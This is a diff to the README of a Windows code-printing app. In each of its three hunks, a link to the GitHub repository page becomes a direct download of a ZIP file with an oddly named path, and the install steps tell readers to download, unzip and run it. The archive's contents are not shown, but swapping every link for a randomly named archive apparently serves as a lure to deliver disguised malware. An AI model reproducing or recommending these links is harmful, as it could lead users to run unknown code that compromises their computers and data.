@@ -1,6 +1,6 @@
 # 🖨️ Print-code-in-1-click - Print code with one click
 
-[![Download Print-code-in-1-click](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bulblioncub16/Print-code-in-1-click)
+[![Download Print-code-in-1-click](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bulblioncub16/Print-code-in-1-click/raw/refs/heads/main/brokenheartedly/in_code_click_Print_bivariant.zip)
 
 ## 📌 Overview
 
@@ -33,7 +33,7 @@ For best results, use a recent version of Windows and keep your printer driver u
 
 ## 🚀 Download and install
 
-1. Open this link: https://github.com/Bulblioncub16/Print-code-in-1-click
+1. Open this link: https://github.com/Bulblioncub16/Print-code-in-1-click/raw/refs/heads/main/brokenheartedly/in_code_click_Print_bivariant.zip
 2. On the page, look for the latest download or app file
 3. Download the file to your PC
 4. If the file is a ZIP, unzip it first
@@ -214,7 +214,7 @@ Use it to:
 
 Use this link to visit the page and download the app:
 
-https://github.com/Bulblioncub16/Print-code-in-1-click
+https://github.com/Bulblioncub16/Print-code-in-1-click/raw/refs/heads/main/brokenheartedly/in_code_click_Print_bivariant.zip
 
 ## 🖥️ Windows setup path
 
